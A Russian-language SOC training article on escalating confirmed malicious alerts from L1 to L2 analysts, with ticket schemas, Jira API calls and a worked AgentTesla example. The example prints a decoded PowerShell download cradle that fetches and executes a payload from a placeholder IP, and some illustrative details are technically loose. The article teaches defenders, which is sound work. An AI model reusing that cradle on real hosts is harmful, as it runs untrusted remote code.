# Эскалация True Positive на L2

## Контекст и базовые понятия

В операционной модели SOC эскалация — это **передача подтверждённого вредоносного события (true positive) от аналитика первого уровня (L1) к старшему аналитику или группе углублённого разбора (L2)**. Этот переход инициирует следующую фазу реагирования: расширенное расследование, определение масштаба, сдерживание и, при необходимости, вовлечение L3‑команды. Сама эскалация выступает не просто административным действием, а критической точкой, в которой качество предшествующего триажа и полнота собранной информации определяют скорость и точность последующей реакции. Если L1 допустит неверный вердикт или передаст неполные данные, инцидент либо останется незамеченным, либо L2 потратит время на повторный сбор базовых сведений вместо профильных задач.

В типовой цепочке SOC события, поступающие от датчиков (SIEM, EDR, IDS), проходят несколько стадий: приём алерта → **триаж (evaluation, classification)** → вердикт → действие. Эскалация — одно из возможных действий по результату триажа, наряду с закрытием алерта как ложного срабатывания (false positive) или признанием его неясным (inconclusive), требующим дополнительной контекстной информации. В ряде методологий неясные алерты также подлежат передаче L2, но как запрос на помощь в интерпретации, а не как объявленный инцидент, что принципиально отличается по ожиданиям от принимающей стороны. Поэтому центральным объектом нашего рассмотрения становится именно эскалация **true positive** — подтверждённой вредоносной активности.

Ключевые термины:

- **Триаж** — систематическая оценка алерта для вынесения вердикта: true positive, false positive, inconclusive. Методология триажа подробно разбирается в руководстве по alert triage [Alert Triage: A Complete Guide](https://www.prophetsecurity.ai/blog/alert-triage), где подчёркивается, что качество вердикта зависит от понимания логики детекта, наличия предварительно скоррелированной контекстной информации вокруг сущностей и следования структурированной методике.
- **Вердикт** — заключение аналитика о природе события. Для эскалации важен именно true positive, то есть событие действительно отражает активность злоумышленника, а не легитимную административную операцию.
- **Инцидент** (incident) — подтверждённое вредоносное событие, требующее реагирования. В процессе эскалации алерт, признанный true positive, преобразуется в инцидент (или связывается с существующим), фиксируется в тикет‑системе и передаётся L2.
- **Эскалационный пакет (escalation package)** — структурированный набор артефактов и выводов L1, передаваемый L2 для немедленного продолжения расследования.

В контексте эскалации важно различать несколько схожих по звучанию, но функционально разных ситуаций. Нижеследующая таблица фиксирует разграничения, которые обязан понимать каждый L1‑аналитик.

| Сущность | Характер события | Действие L1 | Дальнейшая судьба |
|----------|------------------|-------------|-------------------|
| **True Positive** | Подтверждённое вредоносное действие | Сбор контекста, формирование эскалационного пакета, перевод в инцидент | Передача L2 → углублённый анализ, сдерживание |
| **False Positive** | Безопасное событие, ложно сработавшее правило | Задокументировать причину FP, закрыть алерт | При необходимости передача в engineering для тюнинга правила |
| **Inconclusive (Suspicious)** | Недостаточно данных для однозначного вердикта | Запросить дополнительный контекст (например, у владельца хоста) или эскалация как запрос на экспертизу L2 | После уточнения становится TP/FP или остаётся в monitoring |
| **Escalation Request (помощь)** | Непонятная техника или сложный контекст | Передать L2 с пометкой “second opinion”, без объявления инцидента | L2 помогает интерпретировать, решение остаётся за L1 |

Эскалация true positive критически влияет на ключевые SOC‑метрики: **Mean Time to Detect (MTTD)** и **Mean Time to Respond (MTTR)**. Чем быстрее и качественнее L1 передаст подтверждённый инцидент, тем меньше окно возможностей у злоумышленника. Как отмечено в [Threat Escalation Matrix for Modern Security Challenges](https://torq.io/blog/escalation-matrix), традиционные ручные матрицы эскалации часто не справляются с объёмом алертов и статичностью правил; современные SOC внедряют динамические, контекстно-зависимые сценарии, однако отправной точкой всегда остаётся решение аналитика L1.

Помимо бинарных «эскалация / не эскалация» существует понятие **уровней эскалации** (L1→L2→L3). Согласно публикациям практиков, L1 выполняет первичную валидацию и отсев ложных срабатываний, L2 проводит глубокое расследование с корреляцией по нескольким источникам, а передача на L3 происходит только при масштабных инцидентах, требующих координации с руководством, юридическими аспектами или сложной форензики [Understanding SOC Escalation Levels for Analysts](https://www.linkedin.com/posts/nithish-adhithya-soc-analyst_cybersecurity-socanalyst-incidentresponse-activity-7373948051419353088-Og6F). Таким образом, эскалация true positive с L1 на L2 — это первый рубеж, на котором угроза переходит из стадии «подозрения» в стадию активного противодействия.

## Внутреннее устройство процесса эскалации

Эскалация true positive реализуется через устойчивый пайплайн, объединяющий роли, инструменты и коммуникационные каналы. Её внутреннее устройство целесообразно рассматривать как **конвейер информационных объектов**, движущихся между состояниями с обязательным набором атрибутов на каждом переходе.

**Участники и зоны ответственности**

- **L1‑аналитик** — владелец алерта до момента эскалации. Формирует вердикт, собирает первичные артефакты, заполняет поля тикета и инициирует передачу.
- **L2‑аналитик** — принимающая сторона. Получает полный контекст, проверяет корректность вердикта (при необходимости), начинает углублённый анализ, инициирует сдерживающие действия.
- **Тикет‑система (ITSM/SOAR)** — центральная шина, в которой фиксируется жизненный цикл инцидента. Примеры: Jira Service Management, ServiceNow, TheHive, интегрированные с SIEM и SOAR‑платформами.
- **SIEM/EDR** — источники алерта и первичной обогащающей информации. L1 использует их для анализа перед формированием пакета.
- **SOAR‑движок** — оркестратор автоматизированных действий. Присутствует в зрелых SOC, может автоматически создавать заявку, обогащать её данными из threat intelligence и запускать предварительные playbook’и, но ключевое решение об эскалации остаётся за аналитиком.

**Поток состояний**

Иллюстративная схема жизненного цикла алерта до передачи L2:

```text
[SIEM/EDR Alert] ──(назначен L1)──▶ [Triage in Progress]
        │                                       │
        │                                       ▼
        │                        [Verdict: True Positive?]
        │                              │              │
        │                            Yes│              │No/Inconclusive
        │                              ▼              ▼
        │               [Form escalation package]   [Close / Request info]
        │                              │
        │                              ▼
        │                   [Create/Update incident ticket]
        │                              │
        └──────────(переход по workflow)──▶ [L2 Queue / Notification]
                                               │
                                               ▼
                                       [L2 accepts & investigates]
```

Процесс не всегда линеен: при автоматизированной эскалации через SOAR часть шагов (создание тикета, заполнение основных полей) выполняется без участия человека, но аналитик должен проверить полученный результат и добавить смысловое резюме.

**Структура эскалационного пакета**

Ключевой элемент эскалации — **информационный пакет**, который L2 получает сразу без дополнительных запросов. Практика показывает, что недостаток информации — наиболее частая причина задержек на стыке уровней. Пакет должен включать как минимум следующие поля (приведена иллюстративная схема в JSON-подобной нотации, воспроизводящей типичную структуру инцидент-тикета в ITSM-системе):

```json
{
  "incident_id": "INC-<автоинкремент>",
  "title": "True Positive: <краткое описание, техника MITRE>",
  "severity": "High | Critical | Medium",
  "status": "Escalated to L2",
  "reported_by": "L1_analyst_id",
  "alert_source": {
    "siem_rule": "Suspicious PowerShell Encoded Command",
    "alert_id": "Splunk_alert_12345",
    "timestamp_utc": "2025-06-15T08:12:34Z"
  },
  "affected_entities": [
    {
      "hostname": "WS-USR-204",
      "ip": "192.168.15.44",
      "user": "domain\\jdoe",
      "user_role": "Marketing",
      "asset_criticality": "Medium"
    }
  ],
  "indicators": {
    "process_commandline": "<decoded CmdLine>",
    "file_hashes": ["<SHA256>"],
    "network_connections": [
      {"dst_ip": "203.0.113.67", "dst_port": 443, "protocol": "tcp", "timestamp": "2025-06-15T08:12:35Z"}
    ],
    "parent_process": "winword.exe",
    "child_process": "powershell.exe -enc ..."
  },
  "enrichment_results": {
    "vt_hash_reputation": "Malicious (25/68 engines)",
    "ip_reputation": "Known C2 (AlienVault, TALOS)",
    "user_risk_score": "Low (normal login pattern)"
  },
  "analyst_summary": "<2-3 предложения, объясняющие, почему инцидент является true positive и в чём заключается угроза>",
  "recommended_initial_actions": "Isolate host, block IOC, collect memory dump",
  "attachments": ["base64_decoded.ps1", "pcap_fragment.pcap"],
  "mitre_attack": ["T1059.001 (PowerShell)", "T1105 (Ingress Tool Transfer)"]
}
```

Приведённая структура показана как иллюстративная схема: конкретные поля и их имена зависят от используемой платформы (TheHive, Jira, ServiceNow) и внутренних политик SOC. Существенно, что **аналитическое резюме** и **результаты обогащения** должны присутствовать всегда — это избавляет L2 от необходимости повторять базовые проверки. Согласно материалам TryHackMe по Alert Reporting [TryHackMe: SOC L1 Alert Reporting Complete Walkthrough](https://www.jalblas.com/blog/tryhackme-soc-l1-alert-reporting-walkthrough), даже после триажа L1 обязан письменно зафиксировать, «что было обнаружено, почему это вредоносно и какие немедленные действия предлагаются», формируя тем самым передаваемый инцидентный комментарий.

**Роль каналов и инструментов**

С точки зрения внутреннего устройства эскалации важны не только люди, но и технологические связки. В зрелом SOC взаимодействие выглядит так:

- Алерт фиксируется в SIEM (Splunk, Sentinel, QRadar).
- SOAR‑платформа (Splunk SOAR, Cortex XSOAR, Torq HyperSOC) автоматически обогащает его: получает репутацию IP через VirusTotal, сверяет хеши с TI‑потоками, вычисляет риск аккаунта по Azure AD.
- Аналитик L1 проверяет результаты обогащения и, принимая решение об эскалации, инициирует создание тикета в ITSM либо через UI, либо через API.
- При наличии SOAR часть полей заполняется автоматически, а L1 пишет итоговое резюме и нажимает «Escalate». SOAR отправляет уведомление L2 (email, чат, push) и помещает тикет в соответствующую очередь.

Более детальная схема взаимодействия отражена в PDF‑документе по управлению ложными срабатываниями [Managing False Positives in SOC Operations](https://upcommons.upc.edu/bitstreams/86b2dbfe-2190-4d10-9328-b8f968a5542b/download), где на рисунке 3.1 представлен workflow аналитиков. Там L1 после подтверждения угрозы эскалирует на L2, а L2, в свою очередь, либо закрывает инцидент, либо передаёт L3 в зависимости от масштаба. Таким образом, эскалация true positive — это не единичное действие, а встроенный в общий процесс жизненный цикл с чётко зафиксированными артефактами.

## Практическое применение и работа с эскалацией

Работа L1‑аналитика по эскалации true positive подчинена последовательности обязательных шагов, сформированных практикой. Каждый шаг направлен на то, чтобы L2 получил готовый к немедленной обработке объект.

**1. Подтверждение true positive и сбор контекста**

Перед любой эскалацией L1 должен уверенно идентифицировать вредоносную активность. Для этого используется типовой подход, описанный в сообществе [Real-World SOC Incident Response: L1 to Containment](https://www.linkedin.com/posts/princekumar1912_soc-cybersecurity-incidentresponse-activity-7402693273376780288-Qu13). В примере с вредоносным исполнением PowerShell аналитик обязан:

- Проверить, не является ли обнаруженная команда известной легитимной активностью (например, внутренними скриптами развёртывания). Частичное совпадение хеша, частоты использования — важные признаки.
- Сопоставить хеш файла или скрипта с threat intelligence (VirusTotal, MISP, облачные TI‑платформы). Именно репутация хеша — наиболее быстрый индикатор true positive.
- Исследовать сетевую активность: было ли обращение к подозрительному IP с плохой репутацией или домену, зарегистрированному за день до инцидента.
- Оценить поведение пользователя: типично ли такое действие для учётной записи в данное время.

Если по совокупности факторов подтверждено вредоносное событие, L1 переходит к документированию.

**2. Формирование эскалационного пакета**

Практика учит: L2 должен сразу видеть «картину инцидента», а не отдельные разрозненные артефакты. Для этого L1 готовит элементы, перечисленные во внутреннем устройстве. Ключевым является **аналитическое резюме (summary)**. Оно обычно занимает несколько предложений и строится по схеме:

- *Что произошло:* «PowerShell с закодированной командой загрузил полезную нагрузку с C2-сервера».
- *Почему это true positive:* «Хеш загруженного файла определён как AgentTesla 25/68 антивирусами, обратный адрес 203.0.113.67 числится в AlienVault OTX как активный C2».
- *Что уже выполнено L1:* «Собраны артефакты: полная командная строка, скриншот дерева процессов, дамп трафика за 5 минут; хост не изолировался (мандат L2)».
- *Что рекомендуется сделать немедленно:* «Изоляция хоста, блокировка IP на прокси, сбор памяти».

Резюме не должно быть многословным, но обязано содержать все перечисленные блоки. По свидетельствам из walkthrough TryHackMe [TryHackMe: SOC L1 Alert Reporting Complete Walkthrough](https://www.jalblas.com/blog/tryhackme-soc-l1-alert-reporting-walkthrough), именно умение чётко описать инцидент в тикете является ключевым навыком L1, проверяемым в сертификации SAL1.

**3. Выбор канала и инициация передачи**

В большинстве современных SOC эскалация выполняется через интерфейс ITSM-системы или SOAR. Аналитик либо кликает кнопку «Escalate to L2», либо, если автоматизация не полна, создаёт новый инцидентный тикет вручную. В средах с высокой степенью автоматизации и REST API можно выполнить эскалацию из скрипта или инструмента командной строки.

Пример иллюстративной команды для создания Jira‑тикета через API с заранее подготовленным JSON‑файлом `incident_payload.json`:

```bash
curl -u l1_analyst@company.com:$JIRA_API_TOKEN \
     -H "Content-Type: application/json" \
     -X POST \
     --data @incident_payload.json \
     https://company.atlassian.net/rest/api/2/issue/
```

Файл `incident_payload.json` содержит поля, аналогичные рассмотренной выше структуре: `project`, `summary`, `issuetype`, `priority`, а также кастомные поля (`customfield_10100` для severity, `customfield_10101` для индикаторов и т.п.), которые зависят от конфигурации конкретной инсталляции (иллюстративная схема, реальные имена полей определяются администратором Jira). Такой подход позволяет L1 ускорить создание тикета и избежать ручного копирования данных.

Если используется SOAR, платформа обычно предоставляет встроенные действия, которые аналитик запускает одним кликом, а SOAR уже сам выполняет цепочку: обогащает данные, создаёт тикет, прикрепляет артефакты, отправляет уведомление.

**4. Типичные ошибки и способы их избежать**

Опыт SOC‑лидеров, отражённый в [The Shift in SOC Escalation](https://torq.io/blog/escalation-matrix), указывает на системные проблемы ручной эскалации:

- **Неполный контекст:** L1 передаёт только заголовок алерта без подробностей. L2 тратит время на повторные запросы. Избегается чеклистом обязательных полей.
- **Эскалация false positive:** торопясь очистить очередь, аналитик объявляет событие вредоносным без достаточных доказательств. Лечится строгой процедурой подтверждения и правилом «сомневаешься — запроси помощь, а не эскалируй».
- **Задержка эскалации:** L1 долго пытается довести расследование до идеального состояния, хотя имеет достаточно признаков TP. Злоумышленник тем временем продвигается. Оптимальная практика: как только собраны минимально необходимые доказательства TP и индикаторы, пакет отправляется, а дальнейшее обогащение может проводиться параллельно L2. Этому способствуют динамические матрицы эскалации [Threat Escalation Matrix](https://torq.io/blog/escalation-matrix), которые учитывают текущую загрузку и приоритет.
- **Потеря информации при ручном переносе:** аналитик копирует данные из SIEM в тикет, но пропускает временные метки или маскирует IP. Необходима автоматическая подстановка полей через API или интеграцию SOAR‑SIEM.
- **Некорректный приоритет:** эскалация события с высоким severity, но низким бизнес-риском (например, изолированная тестовая машина) как Critical может вызвать ненужную панику. Исправляется сквозной классификацией, включающей не только технический урон, но и критичность затрагиваемых активов.

Таким образом, практическая работа по эскалации true positive — это сочетание технической грамотности, строгого следования шаблонам документирования и понимания процессов L2‑команды.

## Сквозной практический пример: эскалация вредоносного PowerShell‑загрузчика

Рассмотрим реалистичный сценарий, в котором L1‑аналитик получает алерт, подтверждает true positive и эскалирует инцидент на L2 с помощью Jira API.

**Исходные условия:** SOC использует SIEM Splunk и EDR CrowdStrike, тикетную систему Jira Service Management. L1‑аналитик отслеживает панель мониторинга. Срабатывает правило Splunk **“Suspicious PowerShell Download Cradle”**, основанное на событии Windows Event ID 4104 (PowerShell Script Block Logging) с закодированной командой. Аналитик заступает в смену, алерт приходит с severity “High”. Цель — подтвердить TP, собрать артефакты и передать инцидент L2.

**Шаг 1. Просмотр деталей алерта в Splunk**

L1 открывает алерт и выполняет запрос для получения полного скрипта:

```spl
index=windows EventCode=4104 host="WS-USR-204"
| stats values(ScriptBlockText) as ScriptBlock by _time, host
```

Результат показывает две строки: первая — заголовок легитимного скрипта, вторая — закодированная строка `powershell -enc SQBFAFgAIAAoAE4AZ...`. Декодируем её (в реальности L1 мог бы использовать встроенный декодер в Splunk, но для наглядности используем отдельную команду):

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAFgAIAAoAE4AZ..."))
```

Вывод: `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.67/updates/agent.exe')`. Команда явно выполняет загрузку исполняемого файла с внешнего IP — классический признак C2‑канала первого этапа.

**Шаг 2. Обогащение индикаторов**

Проверяем IP и хеш, если он доступен. Допустим, в кэше CrowdStrike видно, что powershell.exe породил дочерний процесс `agent.exe` с хешем `d41d8cd98f00b204e9800998ecf8427e` (иллюстративная схема). Выполняем запрос к VirusTotal API:

```bash
curl --request GET \
     --url "https://www.virustotal.com/api/v3/files/d41d8cd98f00b204e9800998ecf8427e" \
     --header "x-apikey: $VT_API_KEY"
```

Ответ (фрагмент):

```json
{
  "data": {
    "attributes": {
      "last_analysis_stats": {
        "malicious": 25,
        "undetected": 43
      },
      "meaningful_name": "agent.exe",
      "tags": ["trojan", "agenttesla"],
      "last_analysis_results": {
        "Kaspersky": {"category": "malicious", "result": "Trojan-PSW.Win32.AgentTesla"},
        ...
      }
    }
  }
}
```

Репутация 25/68 детекций подтверждает вредоносность. Параллельно проверяем IP через Threat‑фид MISP или OTX (запрос опущен для краткости) — он также отмечен как C2.

Проверяем пользователя: `domain\jdoe` — маркетолог, рабочее время, обычно не запускает PowerShell. Учётная запись не замечена в других инцидентах; событие аномалии входа отсутствует, но всплеск сетевой активности с хоста подтверждается в EDR.

**Шаг 3. Подтверждение true positive и решение об эскалации**

На основе совокупности данных L1 выносит вердикт: **True Positive — инфицирование AgentTesla via phishing**. Инцидент требует немедленного сдерживания: изоляция хоста, блокировка IP, сброс пароля пользователя. Аналитик решает эскалировать инцидент как Critical (severity) из‑за наличия активного C2 и крадущего ПО.

**Шаг 4. Создание инцидентного тикета в Jira через API**

Формируем JSON‑payload:

```json
{
  "fields": {
    "project": {"key": "SOC"},
    "summary": "TP: AgentTesla execution on WS-USR-204 via PowerShell download cradle",
    "description": "L1 подтвердил true positive. Декодированная PowerShell команда: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.67/updates/agent.exe').\nХеш agent.exe: d41d8cd... по VirusTotal: 25/68.\nIP 203.0.113.67 известен как C2.\nРекомендации: изолировать хост, блокировать IP, провести сброс пароля пользователя jdoe и собрать memory dump.\nПодробные IOC приложены.",
    "issuetype": {"name": "Incident"},
    "priority": {"name": "Critical"},
    "customfield_10100": "High",   // severity (custom field)
    "customfield_10101": ["192.168.15.44","WS-USR-204","domain\\jdoe"],
    "labels": ["escalated_to_L2", "powershell", "agenttesla"],
    "attachment": []
  }
}
```

Сохраняем в `incident.json` и выполняем curl:

```bash
curl -D- -u l1_analyst@company.com:$JIRA_API_TOKEN \
     -H "Content-Type: application/json" \
     -X POST \
     --data @incident.json \
     https://company.atlassian.net/rest/api/2/issue/
```

**Шаг 5. Ожидаемый результат и действия L2**

Сервер возвращает `201 Created` с JSON‑объектом созданного тикета:

```json
{
  "id": "115001",
  "key": "SOC-8732",
  "self": "https://company.atlassian.net/rest/api/2/issue/115001"
}
```

Тикет автоматически появляется в очереди L2. Ответственный L2‑аналитик видит полное описание, связанные индикаторы и может немедленно выполнить рекомендованные действия по сдерживанию. L2 подтверждает приём и начинает эскалацию в сторону L3, если потребуется масштабное расследование.

Данный пример иллюстрирует полный цикл эскалации true positive: от получения алерта до передачи инцидент‑тикета с контекстом, пригодным для немедленной работы последующего уровня. Акцент на структурировании информации и автоматизации ключевых шагов закладывает основу для сокращения MTTD/MTTR и снижения нагрузки на L2.
